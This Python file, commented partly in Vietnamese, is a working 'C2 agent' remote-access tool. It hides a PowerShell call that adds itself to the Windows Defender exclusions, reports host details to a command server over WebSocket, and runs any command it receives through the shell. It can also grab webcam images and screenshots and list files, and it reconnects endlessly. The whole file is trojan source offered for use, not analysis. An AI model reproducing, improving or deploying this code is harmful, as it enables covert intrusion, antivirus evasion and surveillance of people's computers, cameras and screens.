"""
C2 Agent - Portable. Double-click to run.
Tự động thêm Defender exclusion + kết nối về C2 Server.
"""
import os, sys, json, time, socket, platform, logging, threading, subprocess

# ========== TỰ ĐỘNG THÊM DEFENDER EXCLUSION ==========
def add_defender_exclusion():
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
        cmd = f'Add-MpPreference -ExclusionPath "{exe_path}"'
        subprocess.run(['powershell', '-WindowStyle', 'Hidden', '-Command', cmd],
                       capture_output=True, shell=False)
    except:
        pass  # Không có quyền admin thì bỏ qua, vẫn chạy tiếp

add_defender_exclusion()
# ======================================================

import psutil
from websocket import WebSocketApp

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] Agent: %(message)s")
log = logging.getLogger("agent")

# ========== CONFIG ==========
SERVER_URL = "127.0.0.1:8000"    # localhost cho agent chay cung may
USE_SSL = False                  # False cho LAN, True cho cloudflare
# ============================

def get_device_id():
    hostname = socket.gethostname()
    import uuid as _uuid
    return f"{hostname}-{_uuid.getnode():012x}"

DEVICE_ID = get_device_id()
WS_URL = f"{'wss' if USE_SSL else 'ws'}://{SERVER_URL}/ws/{DEVICE_ID}"

def get_system_info():
    return {
        "hostname": socket.gethostname(),
        "ip_address": socket.gethostbyname(socket.gethostname()),
        "os_name": platform.system(),
        "os_version": platform.version(),
        "cpu_cores": psutil.cpu_count(logical=True),
        "total_ram_mb": psutil.virtual_memory().total // (1024 * 1024),
        "agent_version": "2.0.0",
    }

def get_health():
    return {
        "cpu_percent": psutil.cpu_percent(interval=1),
        "ram_percent": psutil.virtual_memory().percent,
    }

def execute(cmd, timeout=60):
    c = cmd.strip().lower()
    if c in ["webcam", "camera", "chup", "chụp"]:
        return capture_webcam()
    if c in ["screen", "screenshot", "man hinh"]:
        return capture_screenshot()
    if c.startswith("ls "):
        return list_files(c[3:].strip())
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        out = r.stdout + ("\n[STDERR]\n" + r.stderr if r.stderr else "")
        return {"output": out.strip() or "(no output)", "exit_code": r.returncode}
    except subprocess.TimeoutExpired:
        return {"output": "[ERROR] Timeout", "exit_code": -1}
    except Exception as e:
        return {"output": f"[ERROR] {e}", "exit_code": -1}

def list_files(path="C:\\"):
    try:
        script = f'''
import os, datetime
p = {repr(path)}
if not os.path.exists(p):
    print("[ERROR] Path not found")
    exit(1)
if os.path.isfile(p):
    s = os.stat(p)
    print(f"File: {{os.path.basename(p)}}")
    print(f"Size: {{s.st_size:,}} bytes")
    print(f"Modified: {{datetime.datetime.fromtimestamp(s.st_mtime)}}")
    exit(0)
print(f"📁 {{p}}")
print(f"{{'Name':<40}} {{'Type':<8}} {{'Size':<12}} {{'Modified'}}")
print("-"*80)
items = os.listdir(p)
for name in sorted(items, key=lambda x: (not os.path.isdir(os.path.join(p,x)), x.lower())):
    fp = os.path.join(p, name)
    if os.path.isdir(fp):
        sz = ""
        try: sz = f"{{len(os.listdir(fp))}} items"
        except: sz = "?"
        print(f"{{name:<40}} {{'<DIR>':<8}} {{sz:<12}} {{datetime.datetime.fromtimestamp(os.stat(fp).st_mtime).strftime('%Y-%m-%d %H:%M')}}")
    else:
        s = os.stat(fp)
        print(f"{{name:<40}} {{'':<8}} {{s.st_size:<12,}} {{datetime.datetime.fromtimestamp(s.st_mtime).strftime('%Y-%m-%d %H:%M')}}")
'''
        r = subprocess.run([sys.executable, "-c", script], capture_output=True, text=True, timeout=30)
        out = r.stdout + ("\n[STDERR]\n" + r.stderr if r.stderr else "")
        return {"output": out.strip() or "(no output)", "exit_code": r.returncode}
    except Exception as e:
        return {"output": f"[ERROR] {e}", "exit_code": -1}

def capture_webcam():
    """Chup webcam, tra ve base64 trong output"""
    script = __import__("textwrap").dedent("""
    import subprocess as _sp, sys as _sy, os as _os
    try:
        import cv2 as _cv
    except ImportError:
        _sp.check_call([_sy.executable, "-m", "pip", "install", "opencv-python", "--quiet"])
        import cv2 as _cv
    _cam = _cv.VideoCapture(0, _cv.CAP_DSHOW)
    if not _cam.isOpened():
        _cam = _cv.VideoCapture(0)
    if not _cam.isOpened():
        print("[ERROR] No webcam found", flush=True)
        exit(1)
    _ok, _frame = _cam.read()
    _cam.release()
    if _ok:
        import base64 as _b
        _, _buf = _cv.imencode(".jpg", _frame, [int(_cv.IMWRITE_JPEG_QUALITY), 85])
        _b64 = _b.b64encode(_buf).decode()
        print("[IMG]" + _b64 + "[/IMG]", _frame.shape[0], "x", _frame.shape[1], flush=True)
    else:
        print("[ERROR] Failed to capture", flush=True)
    """)
    try:
        import subprocess
        r = subprocess.run([sys.executable, "-c", script], capture_output=True, text=True, timeout=120)
        out = r.stdout + (r.stderr if r.stderr else "")
        return {"output": out.strip(), "exit_code": r.returncode}
    except Exception as e:
        return {"output": f"[ERROR] {e}", "exit_code": -1}

def capture_screenshot():
    import subprocess, base64
    try:
        ps = (
            'Add-Type -AssemblyName System.Windows.Forms;'
            'Add-Type -AssemblyName System.Drawing;'
            '$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds;'
            '$img = New-Object System.Drawing.Bitmap $b.Width, $b.Height;'
            '$g = [System.Drawing.Graphics]::FromImage($img);'
            '$g.CopyFromScreen($b.X, $b.Y, 0, 0, $b.Size);'
            '$ms = New-Object System.IO.MemoryStream;'
            '$img.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg);'
            '$g.Dispose(); $img.Dispose();'
            'Write-Host ([Convert]::ToBase64String($ms.ToArray()));'
            '$ms.Dispose()'
        )
        r = subprocess.run(["powershell", "-NoProfile", "-Command", ps], capture_output=True, text=True, timeout=30)
        b64 = r.stdout.strip().splitlines()[0]
        if len(b64) > 100:
            return {"output": "[IMG]" + b64 + "[/IMG]", "exit_code": 0}
        return {"output": "Failed: " + (r.stderr or "no image data"), "exit_code": -1}
    except Exception as e:
        return {"output": "[ERROR] " + str(e), "exit_code": -1}

def on_open(ws):
    log.info(f"Connected! ID: {DEVICE_ID}")
    ws.send(json.dumps(get_system_info()))

def on_message(ws, raw):
    try:
        msg = json.loads(raw)
    except:
        return
    if "command" not in msg:   # Bỏ qua heartbeat ACK
        return
    log.info(f"EXEC [{msg.get('command_id','?')}]: {msg.get('command','')}")
    result = execute(msg.get("command", ""), msg.get("timeout", 60))
    ws.send(json.dumps({
        "type": "cmd_result",
        "command_id": msg.get("command_id"),
        "db_id": msg.get("db_id"),
        "output": result["output"],
        "exit_code": result["exit_code"],
    }))

def on_error(ws, e): log.error(f"WS error: {e}")
def on_close(ws, code, msg): log.warning(f"Disconnected ({code}). Reconnect in 5s...")

def heartbeat(ws):
    while ws and ws.sock and ws.sock.connected:
        try:
            ws.send(json.dumps({"type": "heartbeat", **get_health()}))
        except:
            pass
        time.sleep(30)

def main():
    log.info(f"Device: {DEVICE_ID} | Server: {SERVER_URL}")
    while True:
        ws = WebSocketApp(WS_URL, on_open=lambda w: (on_open(w), threading.Thread(target=heartbeat, args=(w,), daemon=True).start()), on_message=on_message, on_error=on_error, on_close=on_close)
        try:
            ws.run_forever(ping_interval=30, ping_timeout=10)
        except KeyboardInterrupt:
            break
        except:
            pass
        time.sleep(5)

if __name__ == "__main__":
    main()
